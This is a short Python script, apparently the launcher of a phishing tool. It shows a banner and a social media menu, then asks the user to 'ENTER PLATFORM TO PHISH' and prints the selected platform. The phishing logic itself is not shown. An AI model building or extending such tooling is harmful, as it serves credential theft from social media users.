import os
from Asessts.assets import banner,SocialMediaMenu,colors
print(banner.banner)

socialmedia=SocialMediaMenu()
socialmedia.display_menu()

userChoice=input(f"{colors.blue}\nENTER PLATFORM TO PHISH:{colors.green} ")
try:
    int(userChoice)
except Exception as e:
    print(e)
    
print(socialmedia.platforms.get(int(userChoice)))

